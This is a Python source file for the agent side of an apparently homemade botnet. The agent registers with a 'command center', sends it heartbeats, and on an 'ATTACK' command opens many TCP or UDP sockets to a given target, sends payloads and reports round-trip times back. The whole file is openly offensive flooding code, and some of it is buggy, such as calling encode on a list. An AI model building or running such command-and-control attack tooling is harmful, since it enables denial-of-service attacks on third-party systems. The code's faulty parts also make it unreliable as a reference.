import socket
import json
import time
from threading import Thread


class AgentInstance:

    def __init__(self, PORT=8574):
        # Default required Variables (CONSTANTS)
        self.HOST = socket.gethostname()
        self.PORT = PORT
        self.LOCAL_IP = "192.168.176.108"

        # Variables
        self.COMMAND_CENTER = None
        self.should_heartbeat = False

        # Thread(s)
        self.heartbeat_thread = Thread(target=self.send_heartbeat)

    def listen(self, MAX_CONNECTIONS=1):
        # Bind the socket to port -> SOCK_STREAM = tcp traffic
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Bind the sockets to the machine ip and 8574 port
        sock.bind((self.LOCAL_IP, self.PORT))
        # Start listening on host and port, accepting a maximal of 50 connections in queue. New requests get denied.
        sock.listen(MAX_CONNECTIONS)

        while True:
            # Using ASCII colors here for readability  \033[#m] is the escape format, the number is the color Yellow = 33 Green=32
            print(
                f"Machine started listening on: \n\033[1;33mIP: \033[1;32m {self.LOCAL_IP}  \n\033[1;33mHostname: \033[1;32m{self.HOST.upper()}  \n\033[1;33mPort: \033[1;32m{self.PORT}")
            if self.COMMAND_CENTER:
                print(f"\033[1;33mCommand Center connected from: \033[1;32m{self.COMMAND_CENTER}")
            else:
                print("\033[1;31mCommand Center not registered yet, please do so before continueing")
            connection, addr = sock.accept()

            # Decode command center's JSON data and assign to variable
            data = connection.recv(1024).decode()
            data = json.loads(data)

            # Attack based on fed data, then break subloop upon completion
            try:
                while True:
                    if data:

                        # Register the command centrum
                        if data['GOAL'] == "REGISTER":
                            try:
                                # Retrieve the command center IP from the message
                                self.COMMAND_CENTER = data["COMMAND_CENTER_IP"]
                                print(
                                    f"\n\033[1;95mCommand Center registration complete @: \033[1;32m{self.COMMAND_CENTER}")
                                # Stop any active heartbeats in case of re-registering
                                self.should_heartbeat = False
                                # Start heartbeats on a seperate thread to not clog the main loop
                                self.should_heartbeat = True
                                self.heartbeat_thread.start()

                            except Exception as e:
                                print("Command center could not register: ", e)
                            break

                        # Attack the target
                        elif data['GOAL'] == "ATTACK" and self.COMMAND_CENTER:
                            print(
                                f"\033[1;95mDebug: Instructed to attack '{data['TARGET'].upper()}' on protocol: '{data['PROTOCOL'].upper()}' * '{data['HITS']}' times")

                            # Start the attack function with a valid IP / PORT / PROTOCOL / HIT amount and the connection instance to report back metrics to the master
                            rtt_data = self.attack(PROTOCOL=data['PROTOCOL'], IP=data["TARGET"], PORT=data["PORT"],
                                                   HITS=data['HITS'])

                            # Send the RTT Data back to the command center for processing
                            try:
                                connection.sendall(rtt_data.encode())
                            except Exception as e:
                                print("ERROR could not send RTT data to command center: ", e)
                            break
                        else:
                            print("Invalid data received, ignoring..")
                            if not self.COMMAND_CENTER:
                                print(
                                    "This is probably because you tried to initiate connections without registering the command center first")
                            break



                    else:
                        print('Data transmission finished from', addr,
                              " closing connection and start listening mode again")
                        break
            finally:
                connection.close()

    def attack(self, IP, PORT, HITS, PROTOCOL="TCP", data=b"Attack Message"):
        # list for storing the sockets
        _sockets = []
        # list for storing the roundtriptimes whom we send back to the command center
        _RTT = []
        # Append the RTT list with the IP of the source machine for data handling
        _RTT.append(self.LOCAL_IP)

        # Check protocol and assign either to TCP or UDP
        for i in range(HITS):

            if PROTOCOL == 'TCP':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _sockets.append(s)
            # print(f"\033[1;95mDebug: attacking on TCP per the Attack function")

            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                _sockets.append(s)
            # print(f"\033[1;95mDebug: attacking on UDP per the Attack function")

        # For the specified amount of hits, open a connection and send data
        for s in _sockets:
            s.connect((IP, PORT))
            try:

                # Send data to target and start timer
                start_time = time.time()
                s.sendall(data)

                # Await response from target
                response = s.recv(1024)

                # Calculate RTT time
                end_time = time.time()
                RTT = end_time - start_time
                _RTT.append(RTT)

                # Close the connection
                s.close()

            # Ff connection  is closed by target, retry
            except socket.error as e:
                if e.errno == 104:
                    print("Connection reset by target, retrying to send data..")
                    # resending data to target
                    s.sendall(data)
        # Return all the roundtrip time data to send to the command center
        return (_RTT)

    # Send HeartBeats to the command center to prove their Health Status | ALWAYS RUN ON A SEPERATE THREAD!
    def send_heartbeat(self):

        # Let the command center know the registration was succesful
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                # Send data to Command Center to confirm successful registration, add the IP of the agent for database registration
                success_message = json.dumps({"REGISTRATION": {"AGENT_IP": f"{self.LOCAL_IP}", "HOSTNAME": f"{self.HOST}"}})
                # Connect to the command center and send the success message to confirm registration
                s.connect(("192.168.1.88", 9191))
                s.sendall(success_message.encode())
                # close the connection
                s.close()
            except Exception as e:
                print("\033[1;31mERROR: Failed to send registration confirmation to Command Center: ", e)
                self.should_heartbeat = False
                self.heartbeat_thread.join()

        # Start the heartbeat
        while self.should_heartbeat:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    # Send Heartbeat(HB) to Command Center
                    heartbeat_message = json.dumps({"HEARTBEAT": {"AGENT_IP": f"{self.LOCAL_IP}", "HOSTNAME": f"{self.HOST}"}})
                    # Connect to the command center and send the HB
                    s.connect((self.COMMAND_CENTER, 9191))
                    s.sendall(heartbeat_message.encode())
                    # close the connection
                    s.close()
                    print("Beat!")
                    time.sleep(30)
            except Exception as e:
                print(f"\033[1;31mERROR: Failed to send HeartBeat to {self.COMMAND_CENTER}: ", e)
                self.heartbeat_thread.join()

        print("\033[1;95mWARNING: HeartBeat stopped!")
